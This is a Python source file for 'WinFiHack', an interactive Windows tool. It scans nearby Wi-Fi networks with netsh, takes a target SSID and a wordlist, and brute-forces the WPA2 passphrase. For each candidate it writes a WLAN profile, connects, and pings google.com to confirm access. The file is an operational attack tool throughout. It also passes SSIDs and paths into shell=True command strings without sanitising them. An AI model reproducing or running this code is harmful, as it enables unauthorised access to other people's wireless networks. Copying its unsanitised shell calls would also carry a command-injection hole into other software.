import subprocess
import json
import pyfiglet
import platform
import os
from time import sleep
from rich.console import Console
from rich.table import Table
from rich import print
from rich.progress import Progress


console = Console()


class WifiBruteForces:
    def __init__(self):
        self.pass_file = "./wordlists/default.txt"
        self.interface = "Wi-Fi"
        self.pass_folder_path = "./wordlists"

    def clearscr(self) -> None:
        try:
            osp = platform.system()
            match osp:
                case "Darwin":
                    os.system("clear")
                case "Linux":
                    os.system("clear")
                case "Windows":
                    os.system("cls")
        except Exception:
            pass

    def get_wifi_networks(self):
        disconnect_result = subprocess.run(
            ["netsh", "wlan", "disconnect", f"interface={self.interface}"],
            capture_output=True,
            text=True,
        )
        if disconnect_result.returncode != 0:
            return json.dumps(
                {
                    "error": "Failed to disconnect from Wi-Fi",
                    "message": disconnect_result.stderr,
                },
                indent=4,
            )
        sleep(5)
        result = subprocess.run(
            ["netsh", "wlan", "show", "network",
                f"interface={self.interface}"],
            capture_output=True,
            text=True,
        )
        if result.returncode == 0:
            lines = result.stdout.split("\n")
            networks = []
            current_network = {}
            network_id = 1
            for line in lines:
                if line.startswith("SSID"):
                    if current_network:
                        current_network["ID"] = network_id
                        networks.append(current_network)
                        current_network = {}
                        network_id += 1
                    parts = line.split(":")
                    ssid = parts[1].strip()
                    current_network["SSID"] = ssid
                elif line.strip().startswith("Network type"):
                    network_type = line.split(":")[1].strip()
                    current_network["Network type"] = network_type
                elif line.strip().startswith("Authentication"):
                    authentication = line.split(":")[1].strip()
                    current_network["Authentication"] = authentication
                elif line.strip().startswith("Encryption"):
                    encryption = line.split(":")[1].strip()
                    current_network["Encryption"] = encryption
            if current_network:
                current_network["ID"] = network_id
                networks.append(current_network)
            self.wifi_networks = json.dumps(networks, indent=4)
            return self.wifi_networks
        else:
            return self.wifi_networks

    def render_json_as_table(self):
        data = json.loads(self.wifi_networks)
        table = Table(show_header=True, header_style="bold magenta")
        if data and isinstance(data, list):
            for key in data[0].keys():
                table.add_column(key, style="dim")
            for item in data:
                table.add_row(
                    *[str(item[key]) for key in item.keys()])
        console.print(table)

    def selection_process(self):
        network_data = json.loads(self.wifi_networks)
        try:
            ID = int(input("Enter SSID ID: "))
            selected_network = next(
                (
                    network for network in network_data if network[
                        "ID"] == ID),
                None
            )
            if selected_network:
                self.target_id = selected_network["SSID"]
            else:
                print("No network found with the given ID.")
        except ValueError:
            print("Please enter a valid ID.")

    def get_network_interfaces(self):
        result = subprocess.run(
            [
                "netsh",
                "interface",
                "show", "interface"], capture_output=True, text=True
        )
        if result.returncode == 0:
            lines = result.stdout.split("\n")[3:]
            interfaces = []
            for line in lines:
                if line.strip():
                    parts = line.split(maxsplit=3)
                    interface = {
                        "Admin State": parts[0],
                        "State": parts[1],
                        "Type": parts[2],
                        "Interface Name": parts[3],
                    }
                    interfaces.append(interface)
            numbered_interfaces = [
                {"ID": i + 1, **iface} for i, iface in enumerate(interfaces)
            ]
            self.interface_data = json.dumps(numbered_interfaces, indent=4)
            return json.dumps(numbered_interfaces, indent=4)
        else:
            return json.dumps(
                {
                    "error": "Failed to run command",
                    "message": result.stderr
                }, indent=4
            )

    def render_interfaces_table(self):
        interfaces = json.loads(self.interface_data)
        console = Console()
        table = Table(show_header=True, header_style="bold magenta")
        table.add_column("ID", style="dim")
        table.add_column("Admin State")
        table.add_column("State")
        table.add_column("Type")
        table.add_column("Interface Name")
        for iface in interfaces:
            table.add_row(
                str(iface["ID"]),
                iface["Admin State"],
                iface["State"],
                iface["Type"],
                iface["Interface Name"],
            )
        console.print(table)

    def select_interface(self):
        interfaces = json.loads(self.interface_data)
        ID = int(input("Enter interface ID to select: "))
        selected_interface = next(
            (iface for iface in interfaces if iface["ID"] == ID), None
        )
        if selected_interface:
            self.interface = selected_interface["Interface Name"]
        else:
            print("Invalid interface ID.")

    def create_wifi_profile_xml(self, passphrase):
        networks = json.loads(self.wifi_networks)
        network_info = next(
            (item for item in networks if item["SSID"] == self.target_id), None
        )

        if not network_info:
            print(f"No network information found for SSID: {self.target_id}")
            return False

        xml_content = f"""<?xml version=\"1.0\"?>
<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
    <name>{self.target_id}</name>
    <SSIDConfig>
        <SSID>
            <name>{self.target_id}</name>
        </SSID>
    </SSIDConfig>
    <connectionType>ESS</connectionType>
    <connectionMode>auto</connectionMode>
    <MSM>
        <security>
            <authEncryption>
                <authentication>WPA2PSK</authentication>
                <encryption>AES</encryption>
                <useOneX>false</useOneX>
            </authEncryption>
            <sharedKey>
                <keyType>passPhrase</keyType>
                <protected>false</protected>
                <keyMaterial>{passphrase}</keyMaterial>
            </sharedKey>
        </security>
    </MSM>
</WLANProfile>"""
        self.xml_path = f"./xml/{self.target_id}.xml"
        with open(self.xml_path, "w") as file:
            file.write(xml_content)
        return True

    def connect_wifi_and_verify_with_interface(self):
        add_profile_cmd = f'netsh wlan add profile filename="{self.xml_path}" interface="{self.interface}"'
        subprocess.run(
            add_profile_cmd,
            shell=True,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
        connect_cmd = (
            f'netsh wlan connect name="{self.target_id}" interface="{self.interface}"'
        )
        subprocess.run(
            connect_cmd,
            shell=True,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
        )
        sleep(5)

        ping_cmd = "ping www.google.com -n 1"
        ping_result = subprocess.run(
            ping_cmd,
            shell=True,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
        )
        if "Received = 1" in ping_result.stdout:
            print(
                f"Connected to {self.target_id}:{self.interface} with internet"
            )
            return True
        else:
            return False

    def list_passfiles(self):
        files = [
            file
            for file in os.listdir(self.pass_folder_path)
            if os.path.isfile(os.path.join(self.pass_folder_path, file))
        ]
        console = Console()
        table = Table(show_header=True, header_style="bold magenta")
        table.add_column("Number", style="dim", width=12)
        table.add_column("File Name", min_width=20)
        files_dict = {}
        for index, file in enumerate(files, start=1):
            files_dict[str(index)] = file
            table.add_row(str(index), file)
        console.print(table)
        while True:
            selection = console.input(
                "[bold green]Enter the number of the file: [/]"
            )
            if selection in files_dict:
                selected_file = files_dict[selection]
                console.print(
                    f"[bold yellow]You have selected:[/] {selected_file}")
                self.pass_file = f"./wordlists/{selected_file}"
                break
            else:
                console.print(
                    "[bold red]Please enter a valid number.[/]"
                )

    def brute_force(self):
        networks = json.loads(self.wifi_networks)
        network_info = next(
            (item for item in networks if item["SSID"] == self.target_id), None
        )

        if not network_info:
            print(f"No network information found for SSID: {self.target_id}")
            return

        with open(self.pass_file, "r") as file:
            passwords = file.readlines()

        with Progress() as progress:
            task1 = progress.add_task(
                "[red]Trying passwords...", total=len(passwords))
            for password in passwords:
                password = password.strip()
                self.create_wifi_profile_xml(password)
                if self.connect_wifi_and_verify_with_interface():
                    print(
                        f"\Conencted to {self.target_id}: Pass: '{password}'"
                    )
                    return True
                progress.update(task1, advance=1)

        print(f"All passwords tested. Failed to connect to {self.target_id}.")
        return False

    def run(self):
        banner = pyfiglet.figlet_format("WinFiHack")
        print(banner)
        main_menu = Table(
            show_header=True, header_style="bold magenta", title="Main Menu"
        )
        main_menu.add_column("OPT", style="dim")
        main_menu.add_column("NAME", style="dim")
        main_menu.add_row("1", "Set Interface")
        main_menu.add_row("2", "Set Target")
        main_menu.add_row("3", "Set Wordlist")
        main_menu.add_row("4", "Show Options")
        main_menu.add_row("5", "Run Attack")
        main_menu.add_row("q", "Quit")
        print(main_menu)
        opt = input("Enter Option: ")
        match opt:
            case "1":
                self.get_network_interfaces()
                self.render_interfaces_table()
                self.select_interface()
                self.clearscr()
                self.run()
            case "2":
                self.get_wifi_networks()
                self.render_json_as_table()
                self.selection_process()
                self.clearscr()
                self.run()
            case "3":
                wordlist_menu = Table(
                    show_header=True,
                    header_style="bold magenta", title="Wordlist Menu"
                )
                wordlist_menu.add_column("OPT", style="dim")
                wordlist_menu.add_column("OPTIONS SET", style="dim")
                wordlist_menu.add_row("1", "Select Wordlist")
                wordlist_menu.add_row("2", "Enter Wordlist Path")
                wordlist_menu.add_row("r", "Return")
                print(wordlist_menu)
                word_opt = input("Enter Wordlist option: ")
                match word_opt:
                    case "1":
                        self.list_passfiles()
                        self.run()
                    case "2":
                        self.pass_file = input("Enter Wordlist path: ")
                        self.clearscr()
                        self.run()
                    case "r":
                        self.run()
                self.clearscr()
                self.run()
            case "4":
                self.clearscr()
                settings_table = Table(
                    show_header=True,
                    header_style="bold magenta", title="Options Set"
                )
                settings_table.add_column("Options")
                settings_table.add_column("Value Set")
                settings_table.add_row("Interface", str(self.interface))
                settings_table.add_row("Target", str(self.target_id))
                settings_table.add_row("Wordlist", str(self.pass_file))
                print(settings_table)
                self.run()
            case "5":
                self.brute_force()
            case "q":
                quit()
        pass


wifi_manager = WifiBruteForces()
networks_json = wifi_manager.run()
